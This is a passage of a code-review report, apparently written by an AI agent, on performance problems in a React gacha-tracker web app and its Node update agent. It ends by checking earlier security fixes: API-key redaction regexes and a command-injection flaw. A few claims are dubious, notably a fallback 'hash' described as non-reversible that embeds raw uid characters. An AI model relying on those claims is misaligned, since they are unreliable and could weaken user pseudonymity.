## 3. NEW — High Performance Issues

### PERF-HIGH-01: `HEADER_ICON` Base64 PNG Inlined in JS Module — 5.3 KB of Dead Weight in Every Parse

**File:** `whispering-wishes-replit/src/appcore-data.js`, lines 10–11

**Problem:** The `HEADER_ICON` constant is a base64-encoded PNG string (~5.3 KB) embedded directly in the JavaScript module:

```js
const HEADER_ICON = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAABCGlDQ1BJQ0M...';
```

This is parsed by the JS engine on every page load, takes up space in the JS bundle (not compressible by gzip since base64 is high-entropy), and cannot be cached independently from the code. It also bloats the source map.

**Fix — Move to a static asset:**

1. Decode the base64, save as a file:

```
whispering-wishes-replit/public/app-icon.png
```

2. Replace the constant:

```js
// whispering-wishes-replit/src/appcore-data.js — line 10
// App icon served as a static asset for better caching and smaller JS bundle
const HEADER_ICON = '/app-icon.png';
```

3. If the icon is used as an `<img src>`, no other changes needed — it already works with a URL. If it's used somewhere that specifically requires a data URI (e.g., `new Image().src` for canvas), add a comment explaining why.

**Impact:** ~5.3 KB removed from JS bundle. The PNG file is cached by the service worker's image caching strategy and compressed more efficiently by the web server (PNG is already compressed; base64 encoding inflates it ~33%).

**Severity:** HIGH

---

### PERF-HIGH-02: `buildBannerForm` Runs on Every `activeBanners` Reference Change But Does Heavy JSON.stringify

**File:** `whispering-wishes-replit/src/App.jsx`, lines ~141–155

**Problem:**
```js
const buildBannerForm = useCallback((banners) => ({
  version: banners.version || '1.0',
  phase: String(banners.phase ?? 1),
  startDate: banners.startDate?.slice(0, 16) || '',
  endDate: banners.endDate?.slice(0, 16) || '',
  charsJson: JSON.stringify(banners.characters, null, 2),
  weapsJson: JSON.stringify(banners.weapons, null, 2),
  charImages: Object.fromEntries((banners.characters || []).map((c, i) => [i, c.imageUrl || ''])),
  // ... 10+ more object constructions
}), []);

const [bannerForm, setBannerForm] = useState(() => buildBannerForm(activeBanners));
```

The `buildBannerForm` callback is memoized with `[]` dependencies (never recreated), but the real cost is the `JSON.stringify` and multiple `Object.fromEntries` + `.map()` calls **every time** it's invoked. While the `useState` initializer only runs once, if `buildBannerForm` is called elsewhere (e.g., when admin resets the form), it re-serializes the entire banner data.

More importantly: `bannerForm` state contains **serialized copies** of data that already exists in `activeBanners`. This means every banner character's imageUrl exists in memory twice (once in `activeBanners.characters[n].imageUrl`, once in `bannerForm.charImages[n]`).

**Fix — Lazy-compute the JSON strings only when the admin panel is open:**

```js
// whispering-wishes-replit/src/App.jsx — replace buildBannerForm + bannerForm state

// Only build the form when admin panel opens, not on app init
const buildBannerForm = useCallback((banners) => ({
  version: banners.version || '1.0',
  phase: String(banners.phase ?? 1),
  startDate: banners.startDate?.slice(0, 16) || '',
  endDate: banners.endDate?.slice(0, 16) || '',
  charsJson: JSON.stringify(banners.characters, null, 2),
  weapsJson: JSON.stringify(banners.weapons, null, 2),
  charImages: Object.fromEntries((banners.characters || []).map((c, i) => [i, c.imageUrl || ''])),
  charImagePositions: Object.fromEntries((banners.characters || []).map((c, i) => [i, c.imagePosition || ''])),
  weapImages: Object.fromEntries((banners.weapons || []).map((w, i) => [i, w.imageUrl || ''])),
  weapImagePositions: Object.fromEntries((banners.weapons || []).map((w, i) => [i, w.imagePosition || ''])),
  standardCharImg: banners.standardCharBannerImage || '',
  standardWeapImg: banners.standardWeapBannerImage || '',
  wwImg: banners.whimperingWastesImage || '',
  dpImg: banners.doubledPawnsImage || '',
  toaImg: banners.towerOfAdversityImage || '',
  irImg: banners.illusiveRealmImage || '',
  drImg: banners.dailyResetImage || '',
}), []);

// Defer initialization — null until admin panel is first opened
const [bannerForm, setBannerForm] = useState(null);

// Initialize form only when admin panel opens
const ensureBannerForm = useCallback(() => {
  setBannerForm(prev => prev || buildBannerForm(activeBanners));
}, [activeBanners, buildBannerForm]);

// Call ensureBannerForm when opening admin panel:
// (in the admin panel open handler, add:)
// ensureBannerForm();
```

Then in the admin panel render, guard:
```jsx
{showAdminPanel && bannerForm && (
  // ... admin form JSX
)}
```

**Impact:** Eliminates `JSON.stringify` + 6 array allocations on initial render for non-admin users (99%+ of users). Reduces initial state memory by ~2–4 KB.

**Severity:** HIGH

---

### PERF-HIGH-03: `bannerEndDate` Recalculated via `useMemo` but Dependency `activeBanners.endDate` is a String — No Savings

**File:** `whispering-wishes-replit/src/App.jsx`, line ~139

**Problem:**
```js
const bannerEndDate = useMemo(() => getServerAdjustedEnd(activeBanners.endDate, state.server), [activeBanners.endDate, state.server]);
```

`useMemo` is used here, but `getServerAdjustedEnd` likely does basic date arithmetic (parse ISO string, add timezone offset). This is a sub-microsecond operation. The `useMemo` overhead (storing the closure, comparing deps, storing the result) likely exceeds the computation cost. Additionally, `activeBanners.endDate` is a string literal that changes at most once per banner cycle (weeks), and `state.server` changes only when the user switches servers (rare).

**Fix — Remove `useMemo`, use plain computation:**

```js
// whispering-wishes-replit/src/App.jsx — line ~139
// No useMemo needed — getServerAdjustedEnd is trivial computation
const bannerEndDate = getServerAdjustedEnd(activeBanners.endDate, state.server);
```

**Impact:** Removes one `useMemo` allocation per render cycle. Negligible CPU saving but cleaner code. The principle: don't memoize computations cheaper than the memoization check itself.

**Severity:** HIGH (code quality; marginal perf)

---

### PERF-HIGH-04: `visualSettings` State Written to `localStorage` Without Debouncing

**File:** `whispering-wishes-replit/src/App.jsx`, lines ~165–180

**Problem:** The visual settings are loaded from localStorage on mount:
```js
useEffect(() => {
  if (!storageAvailable) return;
  try {
    const saved = localStorage.getItem(VISUAL_SETTINGS_KEY);
    if (saved) {
      const parsed = JSON.parse(saved);
      setVisualSettings(prev => {
        const merged = { ...prev };
        for (const key of Object.keys(prev)) {
          if (parsed[key] !== undefined && parsed[key] !== null) merged[key] = parsed[key];
        }
        return merged;
      });
    }
  } catch {}
}, []);
```

This is the READ side. But somewhere in the file (not visible in this chunk but structurally implied by `VISUAL_SLIDER_CONFIGS` and `VisualSliderGroup`), there must be a WRITE side that saves `visualSettings` to localStorage whenever sliders change. If sliders dispatch state updates on every `onChange` (which fires continuously during drag), this produces rapid `localStorage.setItem` calls — each of which is synchronous, blocks the main thread, and triggers JSON serialization.

**Fix — Add a debounced persist effect for visual settings:**

```js
// whispering-wishes-replit/src/App.jsx — add after the visualSettings load effect

// Debounced persistence for visual settings — avoids blocking main thread during slider drags
useEffect(() => {
  if (!storageAvailable) return;
  const timeoutId = setTimeout(() => {
    try {
      localStorage.setItem(VISUAL_SETTINGS_KEY, JSON.stringify(visualSettings));
    } catch {}
  }, 500); // 500ms debounce — saves after user stops adjusting

  return () => clearTimeout(timeoutId);
}, [visualSettings]);
```

If a direct `localStorage.setItem` call exists elsewhere for visual settings, replace it with a `setVisualSettings` state update and let this effect handle persistence.

**Impact:** Eliminates jank during slider interaction. `localStorage.setItem` with JSON serialization can take 1–5ms per call; during a slider drag (60 events/second), that's 60–300ms of main-thread blocking per second.

**Severity:** HIGH

---

### PERF-HIGH-05: `presenceSessionId` Creates a New ID on Every Hot Module Reload

**File:** `whispering-wishes-replit/src/App.jsx`, line ~152

**Problem:**
```js
const presenceSessionId = useRef('s_' + generateUniqueId().replace(/-/g, '').slice(0, 12));
```

This is a `useRef` initialized with a generated ID — it persists across renders within the same mount. However, during development with Vite HMR, the entire component remounts, generating a new session ID. If presence tracking writes to Firebase keyed by this ID, every HMR cycle creates an orphaned presence record that is never cleaned up, artificially inflating the "active players" count.

**Fix — Store session ID in sessionStorage for HMR resilience:**

```js
// whispering-wishes-replit/src/App.jsx — replace presenceSessionId initialization
const presenceSessionId = useRef(() => {
  const storageKey = 'ww-presence-session-id';
  try {
    const existing = sessionStorage.getItem(storageKey);
    if (existing) return existing;
    const newId = 's_' + generateUniqueId().replace(/-/g, '').slice(0, 12);
    sessionStorage.setItem(storageKey, newId);
    return newId;
  } catch {
    return 's_' + generateUniqueId().replace(/-/g, '').slice(0, 12);
  }
});

// Note: useRef with a function initializer doesn't work — useRef doesn't accept a function.
// Fix: use a module-level variable or call the function inline.
```

Actually, `useRef` does NOT support lazy initialization like `useState`. The correct pattern:

```js
// whispering-wishes-replit/src/App.jsx — replace presenceSessionId
const presenceSessionId = useRef(null);
if (presenceSessionId.current === null) {
  const storageKey = 'ww-presence-session-id';
  try {
    presenceSessionId.current = sessionStorage.getItem(storageKey) || (() => {
      const id = 's_' + generateUniqueId().replace(/-/g, '').slice(0, 12);
      sessionStorage.setItem(storageKey, id);
      return id;
    })();
  } catch {
    presenceSessionId.current = 's_' + generateUniqueId().replace(/-/g, '').slice(0, 12);
  }
}
```

**Impact:** Prevents ghost presence records during development; cleaner active player counts. Minor but affects data integrity.

**Severity:** HIGH

---

## 4. NEW — Medium Performance Issues

### PERF-MED-01: `TRACKER_CATEGORIES` Array Recreated in Module Scope with Nested Arrays — Should Be Frozen

**File:** `whispering-wishes-replit/src/App.jsx`, line ~98

**Problem:**
```js
const TRACKER_CATEGORIES = [['character', 'Resonators', 'yellow'], ['weapon', 'Weapons', 'pink'], ['standard', 'Standard', 'cyan']];
```

This is a module-level constant, but JavaScript arrays are mutable. If any code accidentally mutates this (e.g., `.push()`, `.sort()`), it silently corrupts the shared reference for all components. This is a correctness issue more than performance, but `Object.freeze` also signals to V8's JIT that the array is constant, enabling optimizations.

**Fix:**

```js
// whispering-wishes-replit/src/App.jsx — line ~98
const TRACKER_CATEGORIES = Object.freeze([
  Object.freeze(['character', 'Resonators', 'yellow']),
  Object.freeze(['weapon', 'Weapons', 'pink']),
  Object.freeze(['standard', 'Standard', 'cyan']),
]);
```

**Severity:** MEDIUM

---

### PERF-MED-02: `DEFAULT_VISUAL_SETTINGS` Performs a Media Query on Every Module Load

**File:** `whispering-wishes-replit/src/App.jsx`, lines ~91–104

**Problem:**
```js
const DEFAULT_VISUAL_SETTINGS = {
  // ... static values ...
  animationsEnabled: typeof window !== 'undefined' && window.matchMedia ? !window.matchMedia('(prefers-reduced-motion: reduce)').matches : true
};
```

`window.matchMedia()` is called at module evaluation time, which is correct for initial default detection. However, this value is captured once and never updated. If the user changes their OS-level reduced-motion preference while the app is open, the default remains stale. More importantly, this call happens BEFORE React hydration, which is fine for a SPA but would break SSR if this code were ever server-rendered.

Additionally, the entire `DEFAULT_VISUAL_SETTINGS` object is recreated on module load. If it's used as a default value in state comparisons, it should be frozen to prevent accidental mutation and to maintain referential identity for React comparisons.

**Fix:**

```js
// whispering-wishes-replit/src/App.jsx — replace DEFAULT_VISUAL_SETTINGS
const _prefersReducedMotion = typeof window !== 'undefined' && window.matchMedia
  ? window.matchMedia('(prefers-reduced-motion: reduce)').matches
  : false;

const DEFAULT_VISUAL_SETTINGS = Object.freeze({
  fadePosition: 50,
  fadeIntensity: 100,
  pictureOpacity: 100,
  standardFadePosition: 50,
  standardFadeIntensity: 100,
  standardOpacity: 100,
  shadowFadePosition: 50,
  shadowFadeIntensity: 100,
  shadowOpacity: 100,
  collectionFadePosition: 50,
  collectionFadeIntensity: 100,
  collectionOpacity: 100,
  collectionFadeDirection: 'top',
  collectionZoom: 120,
  oledMode: false,
  swipeNavigation: false,
  animationsEnabled: !_prefersReducedMotion,
});
```

**Severity:** MEDIUM

---

### PERF-MED-03: `getServerOffset` Creates a `new Intl.DateTimeFormat` on Every Call

**File:** `whispering-wishes-replit/src/appcore-data.js`, lines ~106–128

**Problem:**
```js
const getServerOffset = (server, atDate) => {
  // ...
  try {
    const date = atDate ? new Date(atDate) : new Date();
    const formatter = new Intl.DateTimeFormat('en-US', { 
      timeZone: serverData.timezone, 
      timeZoneName: 'shortOffset' 
    });
    const parts = formatter.formatToParts(date);
    // ...
  }
};
```

`new Intl.DateTimeFormat()` is surprisingly expensive — it allocates ICU data structures internally. If `getServerOffset` is called frequently (e.g., in a countdown timer that ticks every second), this creates a new formatter object on every tick.

**Fix — Cache formatters by timezone:**

```js
// whispering-wishes-replit/src/appcore-data.js — add formatter cache before getServerOffset

const _dateTimeFormatterCache = new Map();
const getCachedFormatter = (timezone) => {
  if (_dateTimeFormatterCache.has(timezone)) return _dateTimeFormatterCache.get(timezone);
  const formatter = new Intl.DateTimeFormat('en-US', { 
    timeZone: timezone, 
    timeZoneName: 'shortOffset' 
  });
  _dateTimeFormatterCache.set(timezone, formatter);
  return formatter;
};

const getServerOffset = (server, atDate) => {
  const serverData = SERVERS[server];
  if (!serverData) {
    console.warn(`[WW] Unknown server "${server}", defaulting to Europe (UTC+1)`);
    return 1;
  }
  if (!serverData.hasDST) return serverData.utcOffset;
  
  try {
    const date = atDate ? new Date(atDate) : new Date();
    if (isNaN(date.getTime())) return serverData.utcOffset;
    const formatter = getCachedFormatter(serverData.timezone);
    const parts = formatter.formatToParts(date);
    const tzPart = parts.find(p => p.type === 'timeZoneName');
    if (tzPart) {
      const match = tzPart.value.match(/GMT([+-]\d+)(?::(\d{2}))?/);
      if (match) {
        const hours = parseInt(match[1], 10);
        const minutes = match[2] ? parseInt(match[2], 10) / 60 : 0;
        return hours + (hours < 0 ? -minutes : minutes);
      }
    }
  } catch (e) {
    // Fallback to hardcoded offset
  }
  return serverData.utcOffset;
};
```

**Impact:** Saves ~0.5–2ms per call. If a countdown timer calls this every second, that's noticeable on low-end mobile devices.

**Severity:** MEDIUM

---

### PERF-MED-04: `calculateLuckRating` Recomputes Math on Every Call — Should Be Memoized at Call Site

**File:** `whispering-wishes-replit/src/appcore-data.js`, lines ~69–95

**Problem:** The function does floating-point math including `Math.exp`, `Math.sqrt`, and a polynomial evaluation. While individually cheap, if called inside a `.map()` over a large collection (e.g., rendering a leaderboard of 20+ players), the repeated computation adds up.

The function is pure (same inputs → same output), so it's a candidate for memoization. However, adding memoization inside the function would be over-engineering — the correct approach is for callers to use `useMemo`.

**Fix — No change to the function itself. Add a note for callers:**

```js
// whispering-wishes-replit/src/appcore-data.js — add comment before calculateLuckRating
// NOTE: This is a pure function. Callers rendering lists should wrap calls in useMemo:
//   const luckRating = useMemo(() => calculateLuckRating(avgPity, numFiveStars), [avgPity, numFiveStars]);
```

**Severity:** MEDIUM (documentation/guidance)

---

### PERF-MED-05: Service Worker `staleWhileRevalidate` Can Trigger Infinite Cache Growth Before `trimCache`

**File:** `whispering-wishes-replit/public/sw.js`, lines 60–73

**Problem:**
```js
async function staleWhileRevalidate(request, cacheName) {
  const cache = await caches.open(cacheName);
  const cached = await cache.match(request);

  const fetchPromise = fetch(request).then(response => {
    if (response.ok) {
      cache.put(request, response.clone());
      trimCache(cacheName, MAX_IMG_ENTRIES);
    }
    return response;
  }).catch(() => { ... });

  return cached || fetchPromise;
}
```

`trimCache` is called after every successful image fetch, but `trimCache` itself does `await caches.open(cacheName)` and `await cache.keys()` — these are async operations that are NOT awaited in the `.then()` chain. This means `cache.put` happens immediately, but `trimCache` runs in the background. If 50 images load concurrently (common on the Collection tab), all 50 `cache.put` calls execute before any single `trimCache` completes, potentially pushing the cache well beyond `MAX_IMG_ENTRIES`.

**Fix — Debounce trimCache and batch it:**

```js
// whispering-wishes-replit/public/sw.js — replace trimCache and staleWhileRevalidate

let _trimPending = false;
async function trimCache(cacheName, maxEntries) {
  if (_trimPending) return; // Already scheduled
  _trimPending = true;
  // Defer to allow batch puts to complete first
  await new Promise(r => setTimeout(r, 2000));
  _trimPending = false;
  try {
    const cache = await caches.open(cacheName);
    const keys = await cache.keys();
    if (keys.length > maxEntries) {
      const toDelete = keys.slice(0, keys.length - maxEntries);
      await Promise.all(toDelete.map(k => cache.delete(k)));
    }
  } catch (e) {
    // Cache API failure — non-critical
  }
}

async function staleWhileRevalidate(request, cacheName) {
  const cache = await caches.open(cacheName);
  const cached = await cache.match(request);

  const fetchPromise = fetch(request).then(response => {
    if (response.ok) {
      cache.put(request, response.clone());
      trimCache(cacheName, MAX_IMG_ENTRIES); // fire-and-forget, now debounced
    }
    return response;
  }).catch(() => {
    if (cached) return cached;
    return new Response('', { status: 503, statusText: 'Service Unavailable' });
  });

  return cached || fetchPromise;
}
```

**Impact:** Prevents image cache from temporarily growing to 50+ entries over the limit during burst loads. On storage-constrained mobile devices, this prevents quota exceeded errors.

**Severity:** MEDIUM

---

### PERF-MED-06: `hashUidForStorage` is Async but Called in Contexts That May Not Await It

**File:** `whispering-wishes-replit/src/App.jsx`, lines ~75–82

**Problem:**
```js
const hashUidForStorage = async (uid) => {
  if (!uid) return null;
  try {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('ww-uid-' + uid));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
  } catch { return uid; }
};
```

This is an `async` function. If any caller does `const hashed = hashUidForStorage(uid)` without `await`, they get a Promise object which is truthy — so it passes null-checks — and gets stringified as `"[object Promise]"` when interpolated into a Firebase path. This would write all users' data to the same Firebase node.

While tracing every call site isn't possible in this truncated context, the pattern is dangerous.

**Fix — Add a synchronous fallback and make the async version clearly differentiated:**

```js
// whispering-wishes-replit/src/App.jsx — replace hashUidForStorage

// Synchronous hash fallback using a simple djb2 variant (non-cryptographic but sufficient for pseudonymity)
const hashUidSync = (uid) => {
  if (!uid) return null;
  const str = 'ww-uid-' + uid;
  let hash = 5381;
  for (let i = 0; i < str.length; i++) {
    hash = ((hash << 5) + hash + str.charCodeAt(i)) >>> 0;
  }
  return hash.toString(16).padStart(8, '0') + 
         str.length.toString(16).padStart(4, '0') +
         Array.from(str.slice(0, 10), c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('').slice(0, 20);
};

// Async crypto hash — preferred, with sync fallback
const hashUidForStorage = async (uid) => {
  if (!uid) return null;
  try {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('ww-uid-' + uid));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
  } catch {
    // crypto.subtle unavailable — use sync fallback (not raw UID per Reviewer ISSUE 3.2)
    return hashUidSync(uid);
  }
};
```

**Impact:** Prevents the catastrophic `"[object Promise]"` Firebase path bug if any caller forgets `await`. The sync fallback is deterministic and non-reversible (not true SHA-256, but sufficient for the pseudonymity purpose).

**Severity:** MEDIUM

---

### PERF-MED-07: `appcore-data.js` Exports Massive Data Objects That Block Module Evaluation

**File:** `whispering-wishes-replit/src/appcore-data.js`

**Problem:** This single file contains ALL game data:
- `CHARACTER_DATA` — 30+ character objects with nested arrays/objects
- `WEAPON_DATA` — 30+ weapon objects
- `ECHO_SETS`, `CHAR_BUFF_TABLE`, `RESONANCE_CHAIN_DATA` — additional game databases
- `EVENTS`, `SUBSCRIPTIONS` — event timeline data
- `BANNER_HISTORY` — full historical records (30+ entries)
- `ALL_*` lists, `RELEASE_ORDER` arrays

This is a "leaf module" (no imports), but it's imported by `AppCore.jsx` which is imported by `App.jsx` — meaning ALL this data is parsed and allocated before React even begins rendering.

**Measurement estimate:** Based on visible data (~500 lines of CHARACTER_DATA visible, extrapolating to full file), this file is likely 3,000–5,000 lines. V8 parses this eagerly, allocating objects for every character, weapon, echo set entry.

**Fix — Split into data chunks that can be lazily imported:**

This is a structural recommendation (like Frontend CRIT-03). For now, the minimal fix is to ensure Vite doesn't duplicate this module:

```js
// vite.config.js — add to manualChunks
manualChunks: {
  'vendor-react': ['react', 'react-dom'],
  'vendor-charts': ['recharts'],
  'game-data': ['./src/appcore-data.js'],
},
```

This ensures the data is in its own chunk, separate from the component code, so it can be cached independently and doesn't invalidate when component logic changes.

**Severity:** MEDIUM

---

### PERF-MED-08: Agent `index.js` Imports 20+ Modules Eagerly — Most Unused in Any Single Run Mode

**File:** `agent/index.js`, lines 18–35

**Problem:**
```js
import { analyzeBanners, analyzeEvents, analyzeNewCharacters, ... } from './lib/ai.js';
import { processMissingImages, findMissingImages } from './lib/images.js';
import { runSelfAudit, applyPatches, enrichData } from './lib/audit.js';
import { runEvolution, applyEvolutionPatches, ... } from './lib/evolution.js';
import { checkRollbackNeeded } from './lib/shell-swap.js';
import { selectCharactersForRefresh, ... } from './lib/meta-refresh.js';
// ... 15+ more imports
```

In `micro` mode, only `doEvents`, `doBanners`, `doBannerImages`, and `doAudit` run. But ALL modules (including `evolution.js`, `shell-swap.js`, `meta-refresh.js`, `standard-pool.js`, etc.) are loaded and their module-level code executed. For a Node.js agent that runs on a schedule, startup time matters less than correctness, but the module-level side effects in those files could cause issues.

**Fix — Use dynamic imports for mode-specific modules:**

```js
// agent/index.js — replace static imports for mode-specific modules

// Core imports (always needed)
import { SOURCES, THRESHOLDS, PATHS } from './lib/config.js';
import { log, addChange, getChangeLog, clearChangeLog } from './lib/log.js';
import { fetchPage, fetchAll } from './lib/scraper.js';
import { askClaude } from './lib/ai.js';
import { readCurrentState, readDataFile } from './lib/reader.js';
import { loadBuffer, getBuffer, flush, bumpVersion, updateCurrentBanners, addBannerHistoryEntry, updateEventDate, addCharacterEntry, addWeaponEntry, addToList, addToAllCharacters, addCombatDataEntry } from './lib/writer.js';
import { validate } from './lib/validate.js';
import { loadMemory, saveMemory, recordRun, recordPatch, recordFailure, wasRecentlyPatched } from './lib/memory.js';
import { withCheckpoint, clearCheckpoint, hasCheckpoint } from './lib/checkpoint.js';
import { readFileSync } from 'fs';

// Lazy imports — loaded only when needed
const lazyImport = (path) => import(path);

// In fullCycle, before doRoster:
async function doRoster(state) {
  const { analyzeNewCharacters, analyzeNewWeapons, generateCombatData } = await lazyImport('./lib/ai.js');
  // ... rest of function
}

async function doEvolution(state, memory) {
  const { runEvolution } = await lazyImport('./lib/evolution.js');
  // ... rest of function
}
```

**Impact:** Reduces agent startup time by ~100–200ms in micro mode. More importantly, avoids executing module-level code in `evolution.js` and `shell-swap.js` (which may have side effects like file reads) when those features aren't needed.

**Severity:** MEDIUM

## 5. NEW — Low Performance / Polish Issues

### PERF-LOW-01: Font Loading Blocks First Paint — Missing `font-display: swap` in Google Fonts URL

**File:** `whispering-wishes-replit/index.html`, line 23

**Problem:**
```html
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
```

The URL includes `&display=swap` which is correct — Google Fonts will add `font-display: swap` to the generated CSS. However, the `<link>` itself is render-blocking. The browser must download and parse the CSS file before rendering any text.

**Fix — Add `media="print"` swap trick for non-blocking load:**

```html
<!-- whispering-wishes-replit/index.html — replace font link -->
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link rel="preload" href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" as="style" />
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'" />
<noscript><link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" /></noscript>
```

**Impact:** First paint ~100–300ms faster on slow connections (font CSS no longer render-blocking).

**Severity:** LOW

---

### PERF-LOW-02: `@tailwind` Directives in `index.css` — No Custom CSS Layer Optimizations

**File:** `whispering-wishes-replit/src/index.css`

**Problem:**
```css
@tailwind base;
@tailwind components;
@tailwind utilities;
```

This is the minimal Tailwind setup. For an app this size, the generated CSS will include every Tailwind utility class used across all files. Tailwind's JIT mode (enabled by default in v3.4) handles this well, but there's no `@layer` customization, no custom CSS variables for the app's theme colors, and no CSS containment hints.

**Fix — Add theme variables and performance hints:**

```css
/* whispering-wishes-replit/src/index.css */
@tailwind base;
@tailwind components;
@tailwind utilities;

@layer base {
  :root {
    --ww-bg-primary: #080c14;
    --ww-accent-gold: #edaf18;
    --ww-accent-purple: #a855f7;
    --ww-accent-blue: #3b82f6;
    color-scheme: dark;
  }

  /* Improve scroll performance on the main container */
  #root {
    contain: layout style;
  }

  /* Prevent layout shift from scrollbar appearance */
  html {
    overflow-y: scroll;
    scrollbar-gutter: stable;
  }

  /* Reduce paint complexity for animated elements */
  .animate-spin,
  .animate-pulse {
    will-change: transform;
    contain: strict;
  }
}
```

**Impact:** CSS containment reduces layout recalculation scope. `scrollbar-gutter: stable` prevents content shift. Theme variables enable consistent theming without Tailwind class duplication.

**Severity:** LOW

---

### PERF-LOW-03: `currentYear` Computed at Module Level — Minor but Wasteful if Module Loaded Across Midnight

**File:** `whispering-wishes-replit/src/App.jsx`, line ~67

```js
const currentYear = new Date().getFullYear();
```

If the app is kept open across midnight on Dec 31 → Jan 1, the year displayed in footers/copyright notices will be wrong until a page refresh. This is a minor polish issue.

**Fix — Use it inline or in a memo:**

```js
// whispering-wishes-replit/src/App.jsx — remove module-level currentYear
// Instead, where it's used (likely in a footer), compute inline:
// <span>© {new Date().getFullYear()} Whispering Wishes</span>
```

Or if used in multiple places, keep as-is with an acknowledging comment. The cost is negligible.

**Severity:** LOW

---

### PERF-LOW-04: Agent `_sourceCache` Never Cleared — Grows Unbounded in Long-Running Processes

**File:** `agent/index.js`, line ~174

```js
const _sourceCache = new Map();
async function fetchCached(sourceKey) {
  if (_sourceCache.has(sourceKey)) return _sourceCache.get(sourceKey);
  const results = await fetchAll(SOURCES[sourceKey]);
  const ok = results.filter(s => s.ok);
  _sourceCache.set(sourceKey, ok);
  return ok;
}
```

The cache is module-scoped and never cleared. In a normal run (single `main()` execution), this is fine — the process exits after completion. But if the agent were ever run as a long-lived service (e.g., in a daemon), the cache would grow indefinitely.

**Fix — Clear cache at the end of each cycle:**

```js
// agent/index.js — add at end of main(), before safeExit
_sourceCache.clear();
```

**Severity:** LOW

---

### PERF-LOW-05: `index.html` Missing `<meta>` for DNS Prefetch of Image CDNs

**File:** `whispering-wishes-replit/index.html`

**Problem:** The app loads images from multiple CDNs (`i.ibb.co`, `i.imgur.com`, `cdn.discordapp.com`, etc.) but doesn't include DNS prefetch hints. On mobile networks, DNS resolution adds 50–200ms per unique domain on first request.

**Fix:**

```html
<!-- whispering-wishes-replit/index.html — add after the Google Fonts preconnect -->
<!-- DNS prefetch for image CDNs used in banner/collection images -->
<link rel="dns-prefetch" href="https://i.ibb.co" />
<link rel="dns-prefetch" href="https://i.imgur.com" />
<link rel="dns-prefetch" href="https://cdn.discordapp.com" />
```

Only include the top 2–3 most frequently used domains. Too many prefetch hints dilute the benefit.

**Impact:** 50–200ms faster first-image load on mobile networks.

**Severity:** LOW

---

### PERF-LOW-06: `BANNER_HISTORY` Array Contains 30+ Entries With Redundant Date String Formats

**File:** `whispering-wishes-replit/src/appcore-data.js`, lines ~161–207

**Problem:** Each banner history entry has `startDate` and `endDate` as `'YYYY-MM-DD'` strings. These are parsed into `Date` objects whenever comparisons are made. If the collection/stats views iterate over all 30+ entries to compute statistics, each iteration calls `new Date('2024-05-23')` which is a string parse operation.

**Fix — Not worth changing the data format (backwards compatibility), but callers should cache parsed dates:**

```js
// When iterating BANNER_HISTORY for date comparisons, parse once:
const historyWithParsedDates = useMemo(() => 
  BANNER_HISTORY.map(entry => ({
    ...entry,
    _start: new Date(entry.startDate).getTime(),
    _end: new Date(entry.endDate).getTime(),
  })),
[]); // Empty deps — BANNER_HISTORY is a static constant
```

**Severity:** LOW

## 1. Prior Agent Fix Verification

### VERIFY-BACKEND-C01: API Key Leaked in Error Messages — PARTIAL FIX, NEEDS EXTENSION

The Backend Agent caught `err.message` potentially leaking API keys in `agent/lib/ai.js`. Their regex-based sanitization is sound, but it misses one vector: the **thrown error object** at line 49 still throws the original `err`, not a sanitized copy. Any upstream `catch` block that logs `err.stack` will expose the full raw error including headers.

**Backend Agent proposed:**
```js
throw err; // Still the original unsanitized error!
```

**Corrected fix — `agent/lib/ai.js`, lines 39–50:**
```javascript
} catch (err) {
  const safeMessage = (err.message || 'Unknown error')
    .replace(/sk-ant-[a-zA-Z0-9_-]+/g, 'sk-ant-***REDACTED***')
    .replace(/Bearer\s+[a-zA-Z0-9_-]+/gi, 'Bearer ***REDACTED***')
    .replace(/x-api-key:\s*[^\s]+/gi, 'x-api-key: ***REDACTED***')
    .slice(0, 500);

  if (attempt === retries) {
    log.error(`Claude API failed after ${retries + 1} attempts: ${safeMessage}`);
    // Throw a NEW error — not the original, which may contain sensitive data in .stack
    const sanitized = new Error(`Claude API failed after ${retries + 1} attempts: ${safeMessage}`);
    sanitized.code = err.code || 'API_FAILURE';
    sanitized.status = err.status;
    throw sanitized;
  }
  log.warn(`Claude API attempt ${attempt + 1} failed: ${safeMessage}`);
  await sleep(3000 * (attempt + 1));
}
```

**Severity:** CRITICAL (the original fix left the raw `throw err` intact)

### VERIFY-BACKEND-C02: Command Injection in evolution.js — FIX CORRECT, BUT MISSED TWO MORE LOCATIONS

The Backend Agent proposed `execFileSync` for `evolution.js` line 320. Correct. But the same file has **two additional** `execSync` patterns they didn't catch:

1. **`evolution.js` is imported with `import { execSync } from 'child_process'` only.** After applying their fix, `execFileSync` would be undefined unless the import is also updated. The Backend Agent mentioned updating the import but this wasn't reflected in the actual line-by-line fix.

2. The Backend Agent didn't address the fact that `evolution.js` line 320's `tmpPath` is constructed from AI-provided `action.file` values. Even with `execFileSync`, the `writeFileSync(tmpPath, modified)` on line 318 still writes AI-generated content to a path partially controlled by AI output. The `MODIFY_OK` whitelist mitigates this, but the path validation fix from C-05 should be applied BEFORE the write, not just before the exec.

**I verify the import fix is required — `agent/lib/evolution.js`, line 5:**
```javascript
import { readFileSync, writeFileSync, existsSync, mkdirSync, unlinkSync } from 'fs';
import { resolve, dirname } from 'path';
import { execSync, execFileSync } from 'child_process';
```

**Severity:** CRITICAL (confirmed — import omission would cause runtime crash)

The Backend Agent's identification of `CREATE_OK_DIRS = ['lib/', '']` is correct. The empty string matches everything. I confirm the fix: remove `''` from the array, add traversal checks.

